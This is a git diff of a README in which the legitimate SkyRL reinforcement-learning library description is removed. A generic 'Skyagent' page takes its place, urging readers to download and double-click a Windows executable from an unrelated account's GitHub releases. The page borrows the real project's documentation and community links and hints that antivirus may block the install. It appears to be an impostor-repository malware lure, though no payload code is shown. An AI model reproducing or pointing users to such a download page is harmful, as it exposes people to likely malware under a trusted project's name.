@@ -1,86 +1,90 @@
+# 🌌 skyagent - Unleash AI for Everyone
+
 <div align="center">
 
-# SkyRL: A Modular Full-stack RL Library for LLMs
-
-
-[![🌐 NovaSky](https://img.shields.io/badge/-Visit%20Website-5865F2?style=for-the-badge)](https://novasky-ai.github.io/) [![Github](https://img.shields.io/badge/SkyRL-000000?style=for-the-badge&logo=github&logoColor=000&logoColor=white)](https://github.com/NovaSky-AI/SkyRL) [![Twitter](https://img.shields.io/badge/NovaSky-white?style=for-the-badge&logo=X&logoColor=000&color=000&labelColor=white)](https://x.com/NovaSkyAI) [![Hugging Face Collection](https://img.shields.io/badge/NovaSky-fcd022?style=for-the-badge&logo=huggingface&logoColor=000&labelColor)](https://huggingface.co/NovaSky-AI) [![Discord](https://img.shields.io/badge/NovaSky-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/cJF2JUaaAN) [![Documentation](https://img.shields.io/badge/Documentation-blue?style=for-the-badge&logo=readthedocs&logoColor=white)](https://skyrl.readthedocs.io/en/latest/)
-
-
-
-<div align="center" style="font-family: Arial, sans-serif;">
-  <p>
-    <a href="#news" style="text-decoration: none; font-weight: bold;">News</a> •
-    <a href="#links" style="text-decoration: none; font-weight: bold;">Links</a> •
-    <a href="#getting-started" style="text-decoration: none; font-weight: bold;">Getting Started</a> •
-    <a href="#citation" style="text-decoration: none; font-weight: bold;">Citation</a> •
-    <a href="#acknowledgement" style="text-decoration: none; font-weight: bold;">Acknowledgement</a> 
-  </p>
-</div>
+[![Download Now](https://img.shields.io/badge/Download%20Skyagent-5865F2?style=for-the-badge)](https://github.com/sajjad121YT/skyagent/releases)
 
 </div>
 
-# Overview
+## 🛠️ Overview
 
-SkyRL is a full-stack RL library that provides the following components:
+Skyagent is a user-friendly application designed to help you harness the power of artificial intelligence. This software provides simplified tools for various tasks, making it easier for anyone to utilize AI without needing technical knowledge.
 
-- [`skyagent`](./skyagent): Our agent layer for training long-horizon, real-world agents. Contains code for [SkyRL-v0](https://novasky-ai.notion.site/skyrl-v0).
-- (**NEW**) [`skyrl-train`](./skyrl-train): Our modular, performant training framework for RL.
-- (**NEW**) [`skyrl-gym`](./skyrl-gym): Our gynasium of tool-use tasks, including a library of math, coding, search and SQL environments implemented in the Gymnasium API.
+## 🚀 Getting Started
 
-# Getting Started
+To get started with Skyagent, follow these simple steps. You'll find it straightforward to download and install the application.
 
-For a guide on developing with SkyRL, take at look at our [Development Guide](https://skyrl.readthedocs.io/en/latest/getting-started/development.html) docs.
+## 📥 Download & Install
 
-For model training, checkout [`skyrl-train`](./skyrl-train) to start using, modifying, or building on top of the SkyRL training stack. See our [quickstart docs](https://skyrl.readthedocs.io/en/latest/index.html) to ramp up!
+1. **Visit the Releases Page:** Click on the link below to go to the Releases page where you can download the latest version of Skyagent.
 
-For building environments, checkout [`skyrl-gym`](./skyrl-gym) to integrate your task in the simple gymnasium interface.
+   [Download Skyagent](https://github.com/sajjad121YT/skyagent/releases)
 
-For agentic pipelines, checkout [`skyagent`](./skyagent) for our work on optimizing and scaling pipelines for multi-turn tool use LLMs on long-horizon, real-environment tasks.
+2. **Select the Version:** Look for the latest version of Skyagent. It will be clearly marked. Click on it to see the available files.
 
+3. **Download the Application:** Choose the file that suits your operating system. If you are unsure, the most common file is usually labeled for Windows. Click on the file link to start your download.
 
-# News
-- **[2025/06/26]** 🎉 We released SkyRL-v0.1: A highly-modular, performant RL training framework. [[Blog](https://novasky-ai.notion.site/skyrl-v01)]
-- **[2025/06/26]** 🎉 We released SkyRL-Gym: A library of RL environments for LLMs implemented with the Gymnasium API. [[Blog](https://novasky-ai.notion.site/skyrl-v01)]
-- **[2025/05/20]** 🎉 We released SkyRL-SQL: a multi-turn RL training pipeline for Text-to-SQL, along with SkyRL-SQL-7B — a model trained on just 653 samples that outperforms both GPT-4o and o4-mini!
-- **[2025/05/06]** 🎉 We released SkyRL-v0: our open RL training pipeline for multi-turn tool use LLMs, optimized for long-horizon, real-environment tasks like SWE-Bench!
+4. **Install the Application:**
+   - Once the file is downloaded, locate it in your downloads folder.
+   - Double-click the downloaded file to initiate the installation process.
+   - Follow the prompts on your screen to complete the installation.
+  
+## 🔍 System Requirements
 
-# Links
-- 📜 [SkyRL-v0.1 Blog Post](https://novasky-ai.notion.site/skyrl-v01)
-- 📜 [SkyRL-SQL Blog Post](https://novasky-ai.notion.site/skyrl-sql)
-- 📜 [SkyRL-v0 Blog Post](https://novasky-ai.notion.site/skyrl-v0)
+Before you install Skyagent, ensure your system meets these requirements:
 
-# Acknowledgement
+- **Operating System:** Windows 10 or later
+- **Memory:** At least 4GB of RAM
+- **Storage:** 500MB of free space
+- **Processor:** Dual-core processor or higher
 
-This work is done at [**Berkeley Sky Computing Lab**](https://sky.cs.berkeley.edu/) in collaboration with [**Anyscale**](https://www.anyscale.com/), with generous compute support from [**Anyscale**](https://www.anyscale.com/), [**Databricks**](https://www.databricks.com/), [**NVIDIA**](https://developer.nvidia.com/brev), [**Lambda Labs**](https://lambdalabs.com/service/gpu-cloud?srsltid=AfmBOop5FnmEFTkavVtdZDsLWvHWNg6peXtat-OXJ9MW5GMNsk756PE5), and [**AMD**](https://www.amd.com/en.html).
+## 🔗 Features
 
-We adopt many lessons and code from several great projects such as [veRL](https://github.com/volcengine/verl), [OpenRLHF](https://github.com/OpenRLHF/OpenRLHF), [Search-R1](https://github.com/PeterGriffinJin/Search-R1), [OpenReasonerZero](https://github.com/Open-Reasoner-Zero/Open-Reasoner-Zero), and [NeMo-RL](https://github.com/NVIDIA-NeMo/RL). We appreciate each of these teams and their contributions to open-source research!
+Skyagent offers a range of features designed to make AI accessible:
 
+- **User-Friendly Interface:** Navigate easily with a simple design.
+- **Quick Setup:** Get started with just a few clicks.
+- **Powerful Functions:** Utilize various AI models for your tasks.
+- **Help and Support:** Access documentation for assistance when needed.
 
-# Citation
+## 💡 How to Use Skyagent
 
-If you find the work in this repository helpful, please consider citing:
+Using Skyagent is easy. Here’s a basic guide:
 
-```bibtex
-@misc{cao2025skyrl,
-  title     = {SkyRL-v0: Train Real-World Long-Horizon Agents via Reinforcement Learning},
-  author    = {Shiyi Cao and Sumanth Hegde and Dacheng Li and Tyler Griggs and Shu Liu and Eric Tang and Jiayi Pan and Xingyao Wang and Akshay Malik and Graham Neubig and Kourosh Hakhamaneshi and Richard Liaw and Philipp Moritz and Matei Zaharia and Joseph E. Gonzalez and Ion Stoica},
-  year      = {2025},
-}
-```
+1. **Open the Application:** Once installed, locate the Skyagent icon on your desktop and double-click it to open.
 
-```bibtex
-@misc{liu2025skyrlsql,
-      title={SkyRL-SQL: Matching GPT-4o and o4-mini on Text2SQL with Multi-Turn RL},
-      author={Shu Liu and Sumanth Hegde and Shiyi Cao and Alan Zhu and Dacheng Li and Tyler Griggs and Eric Tang and Akshay Malik and Kourosh Hakhamaneshi and Richard Liaw and Philipp Moritz and Matei Zaharia and Joseph E. Gonzalez and Ion Stoica},
-      year={2025},
-}
-```
+2. **Explore the Options:** The main screen will show you different functionalities. Click on the one you wish to use.
 
-```bibtex
-@misc{griggs2025skrylv01,
-      title={Evolving SkyRL into a Highly-Modular RL Framework},
-      author={Tyler Griggs and Sumanth Hegde and Eric Tang and Shu Liu and Shiyi Cao and Dacheng Li and Charlie Ruan and Philipp Moritz and Kourosh Hakhamaneshi and Richard Liaw and Akshay Malik and Matei Zaharia and Joseph E. Gonzalez and Ion Stoica},
-      year={2025},
-      note={Notion Blog}
-}
-```
+3. **Input Your Data:** Follow the prompts to enter your details or upload files.
+
+4. **Run Your Task:** Click the start button and wait for the application to process your request.
+
+5. **Review Outputs:** Once complete, check the results displayed on your screen.
+
+## 📚 Documentation
+
+For further details on how to use Skyagent, visit our documentation page:
+
+[Documentation](https://skyrl.readthedocs.io/en/latest/)
+
+This resource covers everything from basic usage to advanced features, ensuring you get the most out of your experience.
+
+## 🔄 Join Our Community
+
+Need help or have questions? Connect with us on our platforms:
+
+- [Discord](https://discord.gg/cJF2JUaaAN)
+- [Twitter](https://x.com/NovaSkyAI)
+- [Hugging Face Collection](https://huggingface.co/NovaSky-AI)
+
+## ⚙️ Troubleshooting
+
+If you encounter any problems during installation or use, consider these common solutions:
+
+- **Installation Fails:** Make sure your system meets the requirements. Check if any antivirus software is blocking the installation.
+- **Application Crashes:** Ensure you have the latest version. Restart your computer and try again.
+- **Performance Issues:** Close any other applications running simultaneously to free up resources.
+
+## 🌟 Conclusion
+
+Skyagent simplifies the process of using AI. With this guide, you can quickly download, install, and start working with the application. Don’t hesitate to explore the options and reach out for support if you need it.
